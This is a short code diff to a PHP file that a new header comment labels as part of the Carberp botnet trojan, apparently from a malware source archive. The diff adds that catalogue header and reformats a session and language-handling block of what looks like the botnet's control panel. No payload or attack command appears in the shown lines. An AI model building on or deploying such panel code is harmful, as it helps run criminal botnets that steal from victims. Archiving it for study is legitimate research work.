@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 setlocale(LC_ALL,"ru_RU.UTF-8");
@@ -95,9 +106,12 @@ if(!isset($_SESSION['user']->PHPSESSID) || $_SESSION['user']->PHPSESSID != $_COO
 	$_SESSION['user']->access['accounts']['exit'] = 'on';
 	$_SESSION['user']->access['accounts']['captcha'] = 'on';
 	$_SESSION['user']->access['accounts']['confirm'] = 'on';
-}else{	if(!empty($_SESSION['user']->config['lang'])){		$config['lang'] = $_SESSION['user']->config['lang'];
+}else{
+	if(!empty($_SESSION['user']->config['lang'])){
+		$config['lang'] = $_SESSION['user']->config['lang'];
 		language($_SESSION['user']->config['lang']);
-	}else{		language($config['lang']);
+	}else{
+		language($config['lang']);
 	}
 }
 
